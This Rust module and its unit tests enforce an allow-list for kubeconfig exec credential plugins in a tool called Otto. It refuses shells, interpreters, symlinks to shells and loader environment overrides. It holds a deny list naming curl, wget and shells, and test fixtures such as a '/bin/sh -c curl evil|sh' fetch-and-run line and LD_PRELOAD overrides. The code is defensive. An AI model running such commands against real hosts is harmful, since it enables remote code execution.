//! Kubeconfig credential-plugin allow-list (S11-303).
//!
//! A kubeconfig user's `exec` block names a program that kubectl — and Otto's
//! own token cache (`otto_k8s::eks_token`) — runs on the daemon host, outside
//! any sandbox. A kubeconfig an agent pasted, or a file it wrote in its work
//! tree and registered, could otherwise run `/bin/sh -c 'curl … | sh'` the
//! next time the cluster list refreshes. So Otto runs ONLY the well-known
//! cloud credential plugins in [`ALLOWED_EXEC_PLUGINS`] — plus the general
//! CLIs in [`ALLOWED_EXEC_SUBCOMMANDS`], for their credential subcommand
//! only — refuses the
//! environment variables that would make even those load foreign code or a
//! foreign config (which can name a `credential_process`), and refuses a
//! legacy `auth-provider` block that runs a command (`cmd-path`).
//!
//! The checks are pure (serde_json values: YAML callers convert first) and run
//! on import, on registering / re-pointing a kubeconfig path, at EKS import,
//! and again whenever the token cache derives a context's credential — so a
//! file edited on disk after registration is caught before anything runs.

use std::path::Path;

use serde_json::Value;

/// The only exec credential plugins Otto runs, matched on the command's
/// basename (bare, or an absolute path whose basename — and, when it exists,
/// its symlink-resolved target's basename — is one of these).
pub const ALLOWED_EXEC_PLUGINS: &[&str] = &[
    "aws",
    "aws-iam-authenticator",
    "gke-gcloud-auth-plugin",
    "kubelogin",
];

/// General-purpose CLIs that are also common credential plugins, allowed only
/// when `args` START with their credential subcommand (the same binary runs
/// anything else): kubelogin as a kubectl plugin, Teleport, DigitalOcean.
/// Matched on the basename like [`ALLOWED_EXEC_PLUGINS`].
pub const ALLOWED_EXEC_SUBCOMMANDS: &[(&str, &[&str])] = &[
    ("kubectl", &["oidc-login", "get-token"]),
    ("tsh", &["kube", "credentials"]),
    (
        "doctl",
        &["kubernetes", "cluster", "kubeconfig", "exec-credential"],
    ),
    ("gcloud", &["config", "config-helper"]),
    ("az", &["account", "get-access-token"]),
];

/// Credential wrappers that run ANOTHER command with fetched credentials:
/// allowed only as `<wrapper> exec … -- <command> <args…>` where the wrapped
/// command is itself an allowed (non-wrapper) invocation.
pub const ALLOWED_EXEC_WRAPPERS: &[&str] = &["aws-vault", "saml2aws"];

/// Programs a person may never add to the extra allow-list: each runs
/// arbitrary code from its arguments.
const NEVER_EXTRA: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "env",
    "xargs",
    "python",
    "python3",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "osascript",
    "open",
    "curl",
    "wget",
    "aws-vault",
    "saml2aws",
];

/// Extra plugins Otto's owner allowed (settings `kubeconfig_exec_plugins`,
/// root-only): run with any arguments, like [`ALLOWED_EXEC_PLUGINS`].
static EXTRA_PLUGINS: std::sync::RwLock<Vec<String>> = std::sync::RwLock::new(Vec::new());

/// Settings key holding the owner's extra exec-plugin names (root-only, as
/// every `PUT /settings` write).
pub const EXTRA_PLUGINS_SETTING: &str = "kubeconfig_exec_plugins";

/// The entries of an extra allow-list that can never be added: a path, a
/// shell, an interpreter or a wrapper.
pub fn refused_extra_plugins<S: AsRef<str>>(names: &[S]) -> Vec<String> {
    names
        .iter()
        .map(|n| n.as_ref().trim())
        .filter(|n| n.contains('/') || NEVER_EXTRA.contains(n))
        .map(str::to_string)
        .collect()
}

/// Replace the owner's extra allow-list (from [`EXTRA_PLUGINS_SETTING`]).
/// Only bare program names are kept, and never a shell or interpreter.
/// Returns the names that were refused.
pub fn set_extra_plugins<S: AsRef<str>>(names: &[S]) -> Vec<String> {
    let refused = refused_extra_plugins(names);
    let kept = names
        .iter()
        .map(|n| n.as_ref().trim())
        .filter(|n| !n.is_empty() && !refused.iter().any(|r| r == n))
        .map(str::to_string)
        .collect();
    *EXTRA_PLUGINS.write().unwrap_or_else(|e| e.into_inner()) = kept;
    refused
}

fn extra_plugin(name: &str) -> bool {
    EXTRA_PLUGINS
        .read()
        .unwrap_or_else(|e| e.into_inner())
        .iter()
        .any(|p| p == name)
}

/// Exec-plugin `env` names that would make an allowed plugin load foreign
/// code (dynamic-loader / interpreter hooks), run a shell rc file, or read a
/// config that can itself name a command (`credential_process`, a gcloud
/// Python, `$HOME/.aws/config`).
const DENIED_ENV: &[&str] = &[
    "PATH",
    "HOME",
    "BASH_ENV",
    "ENV",
    "ZDOTDIR",
    "NODE_OPTIONS",
    "AWS_CONFIG_FILE",
    "AWS_SHARED_CREDENTIALS_FILE",
    "CLOUDSDK_CONFIG",
    "AZURE_CONFIG_DIR",
];
const DENIED_ENV_PREFIXES: &[&str] = &["DYLD_", "LD_", "PYTHON", "CLOUDSDK_PYTHON"];

fn allowed_name(name: &str) -> bool {
    ALLOWED_EXEC_PLUGINS.contains(&name) || extra_plugin(name)
}

/// How a program may run as a credential plugin.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    AnyArgs,
    Subcommand(&'static [&'static str]),
    Wrapper,
}

fn kind_of(name: &str) -> Option<Kind> {
    if allowed_name(name) {
        Some(Kind::AnyArgs)
    } else if ALLOWED_EXEC_WRAPPERS.contains(&name) {
        Some(Kind::Wrapper)
    } else {
        subcommand_of(name).map(Kind::Subcommand)
    }
}

/// The credential subcommand `name` must be run with, when it is one of
/// [`ALLOWED_EXEC_SUBCOMMANDS`].
fn subcommand_of(name: &str) -> Option<&'static [&'static str]> {
    ALLOWED_EXEC_SUBCOMMANDS
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(_, sub)| *sub)
}

fn allow_list() -> String {
    let scoped = ALLOWED_EXEC_SUBCOMMANDS
        .iter()
        .map(|(n, sub)| format!("{n} {}", sub.join(" ")));
    let wrappers = ALLOWED_EXEC_WRAPPERS
        .iter()
        .map(|w| format!("{w} exec … -- <an allowed plugin>"));
    let extra = EXTRA_PLUGINS
        .read()
        .unwrap_or_else(|e| e.into_inner())
        .clone();
    ALLOWED_EXEC_PLUGINS
        .iter()
        .map(|p| p.to_string())
        .chain(extra)
        .chain(scoped)
        .chain(wrappers)
        .collect::<Vec<_>>()
        .join(", ")
}

/// Check one exec `command` run with no arguments. `Err` carries a
/// user-facing reason naming it.
pub fn check_exec_command(command: &str) -> Result<(), String> {
    check_exec_invocation(command, &[])
}

/// Check one exec `command` with its `args`: an allowed plugin with any
/// arguments, or a subcommand-scoped CLI whose `args` start with its
/// credential subcommand.
pub fn check_exec_invocation(command: &str, args: &[&str]) -> Result<(), String> {
    let cmd = command.trim();
    if cmd.is_empty() {
        return Err("exec credential plugin has no command".into());
    }
    let refuse = |why: &str| {
        Err(format!(
            "exec credential plugin '{cmd}' is not allowed ({why}) — Otto only runs {}",
            allow_list()
        ))
    };
    if cmd.contains('/') && !cmd.starts_with('/') {
        return refuse("a relative path");
    }
    let path = Path::new(cmd);
    let base = if cmd.contains('/') {
        path.file_name().and_then(|n| n.to_str()).unwrap_or("")
    } else {
        cmd
    };
    let Some(kind) = kind_of(base) else {
        return refuse("not an allowed plugin");
    };
    // A symlink named `aws` pointing at a shell is still a shell.
    if cmd.contains('/') {
        if let Ok(real) = std::fs::canonicalize(path) {
            let real_base = real.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if kind_of(real_base) != Some(kind) {
                return refuse(&format!("it resolves to '{}'", real.display()));
            }
        }
    }
    let given: Vec<&str> = args.iter().map(|a| a.trim()).collect();
    match kind {
        Kind::AnyArgs => Ok(()),
        Kind::Subcommand(sub) if given.starts_with(sub) => Ok(()),
        Kind::Subcommand(sub) => {
            refuse(&format!("'{base}' only runs as '{base} {}'", sub.join(" ")))
        }
        Kind::Wrapper => {
            let inner = given
                .iter()
                .position(|a| *a == "--")
                .filter(|_| given.first() == Some(&"exec"))
                .map(|i| &given[i + 1..]);
            let Some([inner_cmd, inner_args @ ..]) = inner else {
                return refuse(&format!(
                    "'{base}' only runs as '{base} exec … -- <an allowed plugin>'"
                ));
            };
            let inner_base = inner_cmd.rsplit('/').next().unwrap_or("");
            if ALLOWED_EXEC_WRAPPERS.contains(&inner_base) {
                return refuse("a wrapper inside a wrapper");
            }
            check_exec_invocation(inner_cmd, inner_args)
        }
    }
}

/// Check a user's `exec` block: its command and its `env` names.
pub fn check_exec_block(exec: &Value) -> Result<(), String> {
    let command = exec.get("command").and_then(Value::as_str).unwrap_or("");
    let args: Vec<&str> = exec
        .get("args")
        .and_then(Value::as_array)
        .map(|a| a.iter().map(|v| v.as_str().unwrap_or("")).collect())
        .unwrap_or_default();
    check_exec_invocation(command, &args)?;
    if let Some(env) = exec.get("env").and_then(Value::as_array) {
        for e in env {
            let name = e.get("name").and_then(Value::as_str).unwrap_or("").trim();
            let upper = name.to_ascii_uppercase();
            if DENIED_ENV.contains(&upper.as_str())
                || DENIED_ENV_PREFIXES.iter().any(|p| upper.starts_with(p))
            {
                return Err(format!(
                    "exec credential plugin '{}' may not set {name} — it would let the plugin \
                     load foreign code or configuration",
                    command.trim()
                ));
            }
        }
    }
    Ok(())
}

/// Check a legacy `auth-provider` block: refused when it runs a command.
pub fn check_auth_provider(ap: &Value) -> Result<(), String> {
    let name = ap.get("name").and_then(Value::as_str).unwrap_or("?");
    let config = ap.get("config");
    let runs = ["cmd-path", "cmd-args"].iter().any(|k| {
        config
            .and_then(|c| c.get(*k))
            .and_then(Value::as_str)
            .is_some_and(|v| !v.trim().is_empty())
    });
    if runs {
        return Err(format!(
            "legacy auth-provider '{name}' runs a command (cmd-path) — Otto refuses it; use an \
             exec credential plugin ({}) instead",
            allow_list()
        ));
    }
    Ok(())
}

/// Check one kubeconfig `users[].user` object.
pub fn check_user(user_name: &str, user: &Value) -> Result<(), String> {
    let at = |e: String| format!("kubeconfig user '{user_name}': {e}");
    if let Some(exec) = user.get("exec").filter(|v| !v.is_null()) {
        check_exec_block(exec).map_err(at)?;
    }
    if let Some(ap) = user.get("auth-provider").filter(|v| !v.is_null()) {
        check_auth_provider(ap).map_err(at)?;
    }
    Ok(())
}

/// Check a whole kubeconfig (as JSON). With `context`, only the user that
/// context names is checked (kubectl runs nothing else for it) — unless the
/// context or its user is missing, then every user is (fail closed).
pub fn check_kubeconfig(cfg: &Value, context: Option<&str>) -> Result<(), String> {
    let users: Vec<&Value> = cfg
        .get("users")
        .and_then(Value::as_array)
        .map(|a| a.iter().collect())
        .unwrap_or_default();
    let name_of = |u: &Value| {
        u.get("name")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string()
    };
    let wanted_user = context.and_then(|ctx| {
        cfg.get("contexts")
            .and_then(Value::as_array)?
            .iter()
            .find(|c| c.get("name").and_then(Value::as_str) == Some(ctx))?
            .pointer("/context/user")
            .and_then(Value::as_str)
            .map(str::to_string)
    });
    let selected: Vec<&Value> = match &wanted_user {
        Some(u) if users.iter().any(|x| name_of(x) == *u) => {
            users.iter().copied().filter(|x| name_of(x) == *u).collect()
        }
        _ => users,
    };
    for u in selected {
        if let Some(user) = u.get("user") {
            check_user(&name_of(u), user)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn cfg(user: Value) -> Value {
        json!({
            "contexts": [{"name": "c", "context": {"cluster": "k", "user": "u"}}],
            "users": [{"name": "u", "user": user}],
        })
    }

    #[test]
    fn allowed_plugins_pass_bare_and_absolute() {
        for c in [
            "aws",
            "aws-iam-authenticator",
            "gke-gcloud-auth-plugin",
            "kubelogin",
            "/opt/does-not-exist/bin/aws",
            "/usr/local/bin/kubelogin",
        ] {
            assert!(check_exec_command(c).is_ok(), "{c}");
        }
        let ok = cfg(json!({"exec": {"command": "aws",
            "args": ["eks", "get-token", "--cluster-name", "x"],
            "env": [{"name": "AWS_PROFILE", "value": "dev"}]}}));
        assert!(check_kubeconfig(&ok, Some("c")).is_ok());
    }

    #[test]
    fn shells_relative_paths_and_unknown_plugins_are_refused() {
        for c in [
            "/bin/sh",
            "sh",
            "bash",
            "python3",
            "./aws",
            "bin/aws",
            "../kubelogin",
            "curl",
            "",
            "aws ",
        ] {
            let r = check_exec_command(c);
            if c == "aws " {
                assert!(r.is_ok(), "trimmed");
                continue;
            }
            assert!(r.is_err(), "{c}");
        }
        let err = check_kubeconfig(
            &cfg(json!({"exec": {"command": "/bin/sh", "args": ["-c", "curl evil|sh"]}})),
            None,
        )
        .unwrap_err();
        assert!(
            err.contains("'/bin/sh'") && err.contains("user 'u'"),
            "{err}"
        );
    }

    /// Sweep 2026-10-11 H1: kubelogin as a kubectl plugin, Teleport and
    /// DigitalOcean clusters stopped working under the S11-303 allow-list.
    /// Their CLIs run anything else, so only the credential subcommand passes.
    #[test]
    fn general_clis_pass_only_with_their_credential_subcommand() {
        let ok = [
            (
                "kubectl",
                vec!["oidc-login", "get-token", "--oidc-issuer-url=https://x"],
            ),
            ("/usr/local/bin/kubectl", vec!["oidc-login", "get-token"]),
            ("tsh", vec!["kube", "credentials", "--kube-cluster=prod"]),
            (
                "doctl",
                vec![
                    "kubernetes",
                    "cluster",
                    "kubeconfig",
                    "exec-credential",
                    "id",
                ],
            ),
        ];
        for (c, args) in ok {
            assert!(check_exec_invocation(c, &args).is_ok(), "{c} {args:?}");
        }
        let refused = [
            ("kubectl", vec![]),
            ("kubectl", vec!["--", "exec"]),
            ("kubectl", vec!["exec", "pod", "--", "sh"]),
            ("kubectl", vec!["oidc-login"]),
            ("tsh", vec!["ssh", "root@host"]),
            ("doctl", vec!["compute", "ssh", "x"]),
            ("./kubectl", vec!["oidc-login", "get-token"]),
        ];
        for (c, args) in refused {
            let err = check_exec_invocation(c, &args).unwrap_err();
            assert!(err.contains("not allowed"), "{c} {args:?}: {err}");
        }
        let block = cfg(json!({"exec": {"command": "kubectl",
            "args": ["oidc-login", "get-token", "--oidc-client-id=k"]}}));
        assert!(check_kubeconfig(&block, Some("c")).is_ok());
        let block = cfg(json!({"exec": {"command": "tsh", "args": ["ssh", "x"]}}));
        assert!(check_kubeconfig(&block, Some("c")).is_err());
        // A symlink named `kubectl` pointing at a shell is still refused.
        let dir = std::env::temp_dir().join(format!("otto-kcp-sub-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let link = dir.join("kubectl");
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink("/bin/sh", &link).unwrap();
        assert!(
            check_exec_invocation(link.to_str().unwrap(), &["oidc-login", "get-token"]).is_err()
        );
        let _ = std::fs::remove_file(&link);
        let _ = std::fs::remove_dir(&dir);
    }

    #[test]
    fn credential_wrappers_pass_only_around_an_allowed_plugin() {
        let ok = [
            (
                "aws-vault",
                vec![
                    "exec",
                    "prod",
                    "--",
                    "aws",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "x",
                ],
            ),
            (
                "saml2aws",
                vec![
                    "exec",
                    "--exec-profile",
                    "p",
                    "--",
                    "aws-iam-authenticator",
                    "token",
                ],
            ),
            (
                "aws-vault",
                vec!["exec", "dev", "--", "kubectl", "oidc-login", "get-token"],
            ),
            ("gcloud", vec!["config", "config-helper", "--format=json"]),
            ("az", vec!["account", "get-access-token", "--resource", "x"]),
        ];
        for (c, args) in ok {
            assert!(check_exec_invocation(c, &args).is_ok(), "{c} {args:?}");
        }
        let refused = [
            ("aws-vault", vec!["exec", "prod", "--", "sh", "-c", "id"]),
            (
                "aws-vault",
                vec!["exec", "prod", "--", "aws-vault", "exec", "x", "--", "aws"],
            ),
            ("aws-vault", vec!["exec", "prod"]),
            ("aws-vault", vec!["login", "prod", "--", "aws"]),
            ("saml2aws", vec!["exec", "--", "kubectl", "exec", "pod"]),
            ("gcloud", vec!["compute", "ssh", "x"]),
            ("az", vec!["vm", "run-command", "invoke"]),
        ];
        for (c, args) in refused {
            assert!(check_exec_invocation(c, &args).is_err(), "{c} {args:?}");
        }
    }

    /// The owner's extra allow-list (settings `kubeconfig_exec_plugins`)
    /// adds bare names, never a shell, interpreter, path or wrapper.
    #[test]
    fn extra_plugins_are_owner_opt_in_and_never_shells() {
        let refused = set_extra_plugins(&["corp-kube-auth", "bash", "/opt/x", " ", "python3"]);
        assert_eq!(refused, vec!["bash", "/opt/x", "python3"]);
        assert!(check_exec_invocation("corp-kube-auth", &["login"]).is_ok());
        assert!(check_exec_invocation("/usr/local/bin/corp-kube-auth", &[]).is_ok());
        assert!(check_exec_invocation("bash", &[]).is_err());
        set_extra_plugins::<&str>(&[]);
        assert!(check_exec_invocation("corp-kube-auth", &[]).is_err());
    }

    #[test]
    fn a_symlink_named_like_a_plugin_is_judged_by_its_target() {
        let dir = std::env::temp_dir().join(format!("otto-kcp-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let link = dir.join("aws");
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink("/bin/sh", &link).unwrap();
        let err = check_exec_command(link.to_str().unwrap()).unwrap_err();
        assert!(err.contains("resolves to"), "{err}");
        let _ = std::fs::remove_file(&link);
        let _ = std::fs::remove_dir(&dir);
    }

    #[test]
    fn loader_and_config_env_overrides_are_refused() {
        for name in [
            "DYLD_INSERT_LIBRARIES",
            "LD_PRELOAD",
            "PYTHONSTARTUP",
            "AWS_CONFIG_FILE",
            "HOME",
            "PATH",
            "CLOUDSDK_PYTHON",
        ] {
            let c = cfg(json!({"exec": {"command": "aws",
                "env": [{"name": name, "value": "/tmp/x"}]}}));
            assert!(check_kubeconfig(&c, None).is_err(), "{name}");
        }
    }

    #[test]
    fn auth_provider_with_a_command_is_refused_but_oidc_is_not() {
        let gcp = cfg(json!({"auth-provider": {"name": "gcp",
            "config": {"cmd-path": "/bin/sh", "cmd-args": "-c id"}}}));
        let err = check_kubeconfig(&gcp, Some("c")).unwrap_err();
        assert!(err.contains("auth-provider 'gcp'"), "{err}");
        let oidc = cfg(json!({"auth-provider": {"name": "oidc",
            "config": {"idp-issuer-url": "https://x", "client-id": "k"}}}));
        assert!(check_kubeconfig(&oidc, Some("c")).is_ok());
        assert!(check_kubeconfig(&cfg(json!({"token": "t"})), None).is_ok());
    }

    #[test]
    fn a_context_checks_only_its_user_and_a_missing_one_checks_all() {
        let c = json!({
            "contexts": [{"name": "good", "context": {"user": "ok"}},
                         {"name": "bad", "context": {"user": "evil"}}],
            "users": [{"name": "ok", "user": {"exec": {"command": "kubelogin"}}},
                      {"name": "evil", "user": {"exec": {"command": "/bin/sh"}}}],
        });
        assert!(check_kubeconfig(&c, Some("good")).is_ok());
        assert!(check_kubeconfig(&c, Some("bad")).is_err());
        assert!(check_kubeconfig(&c, Some("missing")).is_err());
        assert!(check_kubeconfig(&c, None).is_err());
    }
}
